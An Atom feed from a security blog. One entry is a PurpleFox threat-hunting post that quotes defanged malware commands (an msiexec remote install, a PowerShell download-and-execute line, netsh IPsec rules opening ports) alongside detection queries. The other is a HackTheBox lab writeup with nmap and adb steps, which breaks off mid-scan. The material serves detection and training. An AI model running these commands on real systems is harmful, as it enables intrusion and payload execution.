<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title type="text">Doomdesire</title>
    <subtitle type="html">MemE is a powerful and highly customizable GoHugo theme for personal blogs.</subtitle>
    <updated>2023-09-21T22:10:56&#43;03:00</updated>
    <id>https://netuserdoomdesire.github.io/</id>
    <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://netuserdoomdesire.github.io/atom.xml" />
    <author>
            <name>Doomdesire</name>
            <uri>https://netuserdoomdesire.github.io/</uri>
            </author>
    
    <generator uri="https://gohugo.io/" version="0.118.2">Hugo</generator>
        <entry>
            <title type="text">Hunting for PurpleFox Exploit Kit</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/general/purplefox_hunting/" />
            <id>https://netuserdoomdesire.github.io/posts/general/purplefox_hunting/</id>
            <updated>2023-09-21T20:57:26&#43;03:00</updated>
            <published>2023-09-21T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Introduction While PurpleFox is not new and has been around for some years now, it appears to still be on the rise. After encountering the following two samples:
https://tria.ge/230921-h86p5sgc32/behavioral2https://tria.ge/230919-tddlnacb87/behavioral2 i decided to share some detection logic that can be helpful in your hunt for it.</summary>
            
                <content type="html">&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;While &lt;b&gt;PurpleFox&lt;/b&gt; is not new and has been around for some years now, it appears to still be on the rise. After encountering the following two samples:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://tria.ge/230921-h86p5sgc32/behavioral2
https://tria.ge/230919-tddlnacb87/behavioral2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i decided to share some detection logic that can be helpful in your hunt for it.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-1-suspicious-process-spawned-from-microsoft-word&#34;&gt;Detection 1: Suspicious process spawned from Microsoft Word&lt;/h1&gt;
&lt;p&gt; The first sample had a &lt;b&gt;Microsoft Word&lt;/b&gt; document spawning powershell instances, something that is very uncommon. We can hunt for the following:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;parent_process == winword.exe
&amp;amp;&amp;amp;
process_name == powershell.exe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; Of course, in general, this is a detection that should not be limited to Microsoft Word and should not be limited to only powershell.exe. MS executables such as excel.exe, powerpnt.exe, outlook.exe, spawning cmd.exe, pwsh.exe, cscript.exe, wscript.exe or other processes they should not be spawing, can also be added to the detection. &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-2-msiexec-remote-file-execute&#34;&gt;Detection 2: Msiexec Remote File Execute&lt;/h1&gt;
&lt;p&gt; The second sample started with the execution of an .lnk file, spawning &lt;b&gt;msiexec.exe&lt;/b&gt; and then connecting to a remote server and executing a payload:
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\msiexec.exe&amp;#34; /i hxxp://black-sun-a335[.]asyorfplmnv[.]workers[.]dev/mnwODBptK6jU/5hwtrLyyHFiv/7b0985c861986ec9e2087ade8273e544009d68e1/SsdxxIp8DqeQ.jpg /q
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can hunt for the following:&lt;/p&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == msiexec.exe
&amp;amp;&amp;amp;
process_cmdline_contains == (http:// Or htpps://)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; As a reminder, using msiexec to execute malicious payloads has previously been used by another malware called &lt;b&gt;Raspberry Robin&lt;/b&gt;, making this detection work for it too. &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-3-powershell-encoded-commands&#34;&gt;Detection 3: PowerShell Encoded Commands&lt;/h1&gt;
&lt;p&gt; After spawning powershell from Microsoft Word, PurpleFox tries to run &lt;b&gt;base64&lt;/b&gt; encoded commands, in order to download a payload from the web. We can hunt for the following: &lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == (powershell.exe OR pwsh.exe)
&amp;amp;&amp;amp;
process_cmdline_contains == (FromBase64String OR -e)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; Something that should be kept in mind for the above detection, is that powershell can run an encoded command without &lt;b&gt;-encodedcommand&lt;/b&gt; being spelled fully. That means that an encoded command can be run with &lt;b&gt;-e&lt;/b&gt;, &lt;b&gt;-en&lt;/b&gt;, &lt;b&gt;-enc&lt;/b&gt;, &lt;b&gt;-enco&lt;/b&gt; etc. &lt;/p&gt;
&lt;p&gt; Furthermore, in EDR products like Carbon Black Cloud, you can also search the above keywords in &lt;b&gt;scriptload content&lt;/b&gt;, as well as &lt;b&gt;fileless scriptload cmdline&lt;/b&gt;. &lt;/p&gt;
&lt;p&gt;This brings us to the next detection opportunity.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-4-powershell-file-download&#34;&gt;Detection 4: Powershell File Download&lt;/h1&gt;
&lt;p&gt; With the encoded command, PurpleFox tries to run the following:
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&amp;#34; -nop -exec bypass -c &amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;hxxp://black-sun-a335[.]asyorfplmnv[.]workers[.]dev/mnwODBptK6jU/zKJFnbnzeum8/37d4fddb6bf2de6611c6655a5cd37972fc33642d/ace.jpg&amp;#39;)&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The above command will download and execute the &lt;b&gt;ace.jpg&lt;/b&gt; file from the requested server. We can hunt for the following: &lt;/p&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == (powershell.exe OR pwsh.exe)
&amp;amp;&amp;amp;
process_cmdline_contains == (.downloaddata OR .downloadstring OR .downloadfile)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; As with the previous detection, you can also search the above keywords in &lt;b&gt;scriptload content&lt;/b&gt;, as well as &lt;b&gt;fileless scriptload cmdline&lt;/b&gt; in an EDR. &lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-5-purplefox-ipsec-policy-name&#34;&gt;Detection 5: PurpleFox IPSEC Policy Name&lt;/h1&gt;
&lt;p&gt; At some point during the execution chain, PurpleFox creates a new IPSEC policy, named &lt;b&gt;qianye&lt;/b&gt;, using &lt;b&gt;netsh&lt;/b&gt;:
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add policy name=qianye
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can hunt for the following: &lt;/p&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == netsh.exe
&amp;amp;&amp;amp;
process_cmdline_contains == (ipsec AND static AND policy AND qianye)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;By not including the keyword &#34;&lt;b&gt;add&lt;/b&gt;&#34; in the detection, we also cover the following activities the malware performs in the next phases, with netsh&lt;/b&gt;:
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add rule name=Rule1 policy=qianye filterlist=Filter1 filteraction=FilteraAtion1
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static set policy name=qianye assign=y
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;As a final note here, while not the best idea to create detections based on specific names used by malware since they are very easy to change, this specific policy name is traced back to at least 2019 and seems to be a very standard IOC.&lt;/b&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;detection-6-netsh---allow-incoming-connection&#34;&gt;Detection 6: Netsh - Allow Incoming Connection&lt;/h1&gt;
&lt;p&gt; After creating the IPSEC policy, PurpleFox uses &lt;b&gt;netsh&lt;/b&gt; to alter the local firewall, by allowing inbound connections to specific ports:
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=UDP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=UDP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=UDP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=2222 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=3333 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=4444 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=5555 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=6666 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=7777 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=8888 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=9000 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=9999 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=14443 protocol=TCP
&amp;#34;C:\Windows\SysWOW64\netsh.exe&amp;#34; ipsec static add filter filterlist=Filter1 srcaddr=Me dstaddr=any dstport=14444 protocol=TCP
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can hunt for the following: &lt;/p&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;process_name == netsh.exe
&amp;amp;&amp;amp;
process_cmdline_contains == (ipsec AND static AND add AND filter AND srcaddr AND dstaddr=me AND dstport)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://twitter.com/bomccss/status/1704656993791959200
https://tria.ge/230921-h86p5sgc32/behavioral2
https://tria.ge/230919-tddlnacb87/behavioral2
&lt;/code&gt;&lt;/pre&gt;</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/general/" term="posts\General\" label="posts\General\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Explore Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/explore/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/explore/</id>
            <updated>2021-10-30T11:06:20&#43;03:00</updated>
            <published>2021-10-30T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Explore Writeup (HackTheBox) Overview Machine: https://www.hackthebox.eu/home/machines/profile/356 Explore is an easy HackTheBox Android device created by bertolis (https://www.hackthebox.eu/home/users/profile/27897). We begin with finding an Android ES File Explorer vulnerability, in which user data are exposed, making us able to get user&amp;rsquo;s credentials from a screenshot on the device.</summary>
            
                <content type="html">&lt;h1 id=&#34;explore-writeup-hackthebox&#34;&gt;Explore Writeup (HackTheBox)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Explore/1.png&#34; alt=&#34;Pasted image 20211019155500.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/356&#34;&gt;https://www.hackthebox.eu/home/machines/profile/356&lt;/a&gt;
Explore is an easy HackTheBox Android device created by &lt;strong&gt;bertolis&lt;/strong&gt; (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27897)&#34;&gt;https://www.hackthebox.eu/home/users/profile/27897)&lt;/a&gt;. We begin with finding an &lt;strong&gt;Android ES File Explorer&lt;/strong&gt; vulnerability, in which user data are exposed, making us able to get user&amp;rsquo;s credentials from a screenshot on the device. From there we can get access on the device via ssh. We then abuse the fact that &lt;strong&gt;Android Debug Bridge&lt;/strong&gt; (&lt;strong&gt;ADB&lt;/strong&gt;) is enabled on the device in order to get a privileged shell.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sC -sV 10.10.10.247 -oN explore.nmap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 08:07 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.086s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE    SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2222/tcp open     ssh     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    SSH-2.0-SSH Server - Banana Studio
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5555/tcp filtered freeciv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SF-Port2222-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6/27%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60D86A06%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SF:LL,24,&lt;span class=&#34;s2&#34;&gt;&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 11.63 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-sC&lt;/strong&gt;: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-sV&lt;/strong&gt;: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-oN&lt;/strong&gt;: Save the nmap output on the designated file in normal format.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;investigating-port-2222&#34;&gt;Investigating port 2222&lt;/h1&gt;
&lt;p&gt;From the output of nmap we can observe that this port is &lt;strong&gt;ssh&lt;/strong&gt;. More specifically, the version enumeration flag of nmap informs us that this is &lt;strong&gt;SSH-2.0-SSH Server - Banana Studio&lt;/strong&gt;. This was interesting so googling for &lt;strong&gt;Banana Studio ssh&lt;/strong&gt;, reveals us that this is an Android application, which means we have to deal with an Android box. Nevertheless, this is no different than any other ssh client, which means it&amp;rsquo;s a dead end for now since we have no valid username or password to work with.&lt;/p&gt;
&lt;h1 id=&#34;investigating-port-5555&#34;&gt;Investigating port 5555&lt;/h1&gt;
&lt;p&gt;Moving to port 5555, it states to be filtered. As stated on the nmap page, the filtering could be from a dedicated firewall device, router rules, or host-based firewall software. Further googling about how port 5555 is related to Android devices, brought me to &lt;a href=&#34;https://doublepulsar.com/root-bridge-how-thousands-of-internet-connected-android-devices-now-have-no-security-and-are-b46a68cb0f20&#34;&gt;this&lt;/a&gt; article. It appears that multiple Android devices are getting shipped with Android Debug Bridge (ADB) enabled. ADB allows developers to communicate with a device remotely without the need to authenticate in order to run a variety of commands, including running shell commands as the highest prileged user, root.  Since this appears to be the case it is very possible that by connecting to this port, will give us root access to the device. To connect to this port we will need &lt;strong&gt;android-tools-adb&lt;/strong&gt; which do not come pre-installed with Kali Linux. To install them we run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt-get install android-tools-adb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;At this point we need to connect to this port with &lt;code&gt;adb&lt;/code&gt;. To do this we run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;adb connect 10.10.10.247:5555
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This command hangs for a while and then eventually times out. It seems that this port is indeed filtered which means we won&amp;rsquo;t be able connect to it. It is something to keep in mind since it&amp;rsquo;s a way to get root on the device according to the article, however it is a dead end for the time being.&lt;/p&gt;
&lt;h1 id=&#34;scanning-for-all-ports&#34;&gt;Scanning for all ports&lt;/h1&gt;
&lt;p&gt;Since nmap default port scan returned 2 ports that got us nowhere, a full port scan was the following step:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -p- 10.10.10.247 -oN explorer.all-ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 08:10 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.083s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;65530&lt;/span&gt; closed ports
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT      STATE    SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2222/tcp  open     EtherNetIP-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5555/tcp  filtered freeciv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;37103/tcp open     unknown
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;42135/tcp open     unknown
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;59777/tcp open     unknown
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Scanning for all ports reveals 2 more ports we can enumerate (since port 37103 appears to be closed):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
